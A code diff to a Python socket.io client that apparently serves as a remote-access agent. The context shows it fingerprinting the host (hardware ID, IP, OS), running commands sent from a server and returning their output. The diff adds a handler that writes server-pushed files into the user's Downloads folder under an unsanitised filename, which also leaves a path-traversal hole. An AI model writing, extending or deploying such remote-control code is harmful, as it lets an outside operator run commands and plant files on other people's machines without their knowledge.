@@ -3,8 +3,10 @@ from command_handler import run_command
 from utils.system_info import get_hwid, get_ip, get_os
 from config import SERVER_URL 
 import sys
+import os
 
 sio = socketio.Client()
+DOWNLOAD_PATH = os.path.join(os.path.expanduser("~"), "Downloads")
 
 @sio.event
 def connect():
@@ -39,3 +41,15 @@ def handle_command(command):
     print(f"[*] Received command: {command}")
     response = run_command(command)
     sio.emit("commandResponse", response)
+
+@sio.on('receiveFile')
+def receive_File(data):
+    filename = data["filename"]
+    filebuffer = data["fileBuffer"]
+
+    file_path = os.path.join(DOWNLOAD_PATH, filename)
+
+    with open(file_path, "wb") as f:
+        f.write(filebuffer)
+    
+    print(f"File {filename} received and saved in {DOWNLOAD_PATH}")
